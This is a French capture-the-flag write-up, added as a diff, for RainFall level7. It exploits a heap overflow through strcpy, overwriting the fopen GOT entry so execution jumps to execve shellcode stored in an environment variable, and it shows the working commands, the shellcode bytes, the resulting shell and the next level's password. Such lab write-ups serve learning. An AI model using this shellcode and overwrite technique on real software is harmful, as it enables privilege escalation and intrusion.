@@ -1,0 +1,40 @@
+Comme au niveau precedent, on a ici une utilisation vulnerable de strcpy, et cette fois ci je vais integrer mon propre shellcode dans l'environnement.
+
+level7@RainFall:~$ ltrace ./level7 aaaabbbbccccddddeeeeffff 1
+__libc_start_main(0x8048521, 3, 0xbffff774, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                      = 0x0804a008
+malloc(8)                                                      = 0x0804a018
+malloc(8)                                                      = 0x0804a028
+malloc(8)                                                      = 0x0804a038
+strcpy(0x0804a018, "aaaabbbbccccddddeeeeffff")                 = 0x0804a018
+strcpy(0x66666666, "1" <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+level7@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+(gdb) x/48x *environ
+0xbffff7dd:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xbffff7ed:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7fd:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff80d:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff81d:	0x90909090	0x90909090	0x90909090	0x90909090
+	...
+
+Afin de de commander l'execution du code malveillant, il faut rediriger l'execution du programme vers celui-ci. Ici cela se fait d'une methode legerement differente que d'habitude, puisque la memoire que l'on veut manipuler se trouve sur la heap et non la stack (malloc).
+On va donc overflow le parametre destination du second strcpy a l'aide du premier strcpy pour prendre le controle d'une adresse voulu (fopen -> argv[1]) et lui attribuer une nouvelle valeur (shellcode <- argv[2])
+
+
+level7@RainFall:~$ objdump -d ./level7 -M intel
+
+./level7:     file format elf32-i386
+	...
+08048430 <fopen@plt>:
+ 8048430:	ff 25 34 99 04 08    	jmp    DWORD PTR ds:0x8049934
+	...
+
+level7@RainFall:~$ ./level7 $(python -c 'print("a" * 20 + "\x34\x99\x04\x08")') $(python -c 'print("\x1d\xf8\xff\xbf")')
+$ whoami
+level8
+$ cat /home/user/level8/.pass
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
